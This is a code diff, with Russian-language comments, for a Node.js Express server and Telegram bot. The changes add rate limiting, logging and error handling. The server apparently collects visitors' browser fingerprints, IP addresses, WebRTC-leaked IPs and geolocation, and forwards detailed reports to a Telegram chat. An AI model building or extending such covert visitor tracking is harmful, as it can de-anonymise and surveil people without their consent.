@@ -2,8 +2,8 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
+const rateLimit = require('express-rate-limit');
 
-const fingerprint = require('./modules/fingerprint');
 const visitorInfo = require('./modules/visitorinfo');
 const reportInfo = require('./modules/reportinfo');
 const mongo = require('./modules/mongo');
@@ -35,10 +35,33 @@ try {
   visitors = {};
 }
 
+// Rate limiting middleware (100 запросов с одного IP за 15 минут)
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 минут
+  max: 100, // максимум 100 запросов
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: 'Слишком много запросов с этого IP, попробуйте позже.'
+});
+app.use(limiter);
+
+// Логирование всех запросов
+app.use((req, res, next) => {
+  const now = new Date().toISOString();
+  console.log(`[${now}] ${req.method} ${req.originalUrl} IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}`);
+  next();
+});
+
 // ROUTES
 app.post(`/bot${TELEGRAM_TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
+});
+
+bot.onText(/\/(\w+)/, async (msg, match) => {
+  const command = match[1];
+  const user = msg.from ? `${msg.from.username || msg.from.id}` : 'unknown';
+  console.log(`[TELEGRAM] Команда: /${command} от ${user} (chatId: ${msg.chat.id})`);
 });
 
 bot.onText(/\/stats/, async (msg) => {
@@ -78,6 +101,7 @@ app.post('/collect', async (req, res) => {
   const ip = visitorInfo.extractIPv4(rawIp);
 
   if (!fp && !ip) {
+    console.warn(`[DEBUG] Нет fingerprint и IP в запросе /collect:`, req.body);
     return res.status(400).json({ ok: false, error: 'Нет fingerprint и IP' });
   }
 
@@ -126,7 +150,9 @@ app.post('/collect', async (req, res) => {
         break;
       }
     }
-  } catch {}
+  } catch (err) {
+    console.error('Ошибка чтения webrtc_ips.log:', err);
+  }
 
   let detailsMsg = reportInfo.buildDetailsReport({
     geoData,
@@ -162,16 +188,20 @@ app.post('/collect', async (req, res) => {
   }
 
   // Сохраняем визит в MongoDB
-  await mongo.saveVisitor(visitId, {
-    fingerprint: fp,
-    ip,
-    time: new Date().toISOString(),
-    userAgent,
-    geo: geoStr,
-    uaParsed: uaData,
-    detailsMsg,
-    visitId
-  });
+  try {
+    await mongo.saveVisitor(visitId, {
+      fingerprint: fp,
+      ip,
+      time: new Date().toISOString(),
+      userAgent,
+      geo: geoStr,
+      uaParsed: uaData,
+      detailsMsg,
+      visitId
+    });
+  } catch (err) {
+    console.error('Ошибка сохранения визита в MongoDB:', err);
+  }
 
   res.json({ ok: true });
 });
@@ -180,6 +210,7 @@ app.post('/collect', async (req, res) => {
 bot.on('callback_query', async (query) => {
   const chatId = query.message.chat.id;
   const data = query.data;
+  console.log(`[TELEGRAM] Callback: ${data} от chatId: ${chatId}`);
   if (data && data.startsWith('details_')) {
     const visitId = data.replace('details_', '');
     try {
@@ -187,12 +218,15 @@ bot.on('callback_query', async (query) => {
       if (visit && visit.detailsMsg) {
         await bot.sendMessage(chatId, visit.detailsMsg, { reply_to_message_id: query.message.message_id });
       } else {
+        console.warn(`[DEBUG] Детальная информация не найдена для visitId: ${visitId}, chatId: ${chatId}`);
         await bot.sendMessage(chatId, 'Детальная информация не найдена. Проверьте, что визит был зафиксирован и сохранён.', { reply_to_message_id: query.message.message_id });
       }
     } catch (err) {
-      console.error('Ошибка MongoDB details:', err);
+      console.error('Ошибка MongoDB details:', err, 'visitId:', visitId, 'chatId:', chatId);
       await bot.sendMessage(chatId, 'Ошибка при получении деталей визита.', { reply_to_message_id: query.message.message_id });
     }
+  } else {
+    console.warn(`[DEBUG] Неизвестный callback data: ${data} от chatId: ${chatId}`);
   }
 });
 
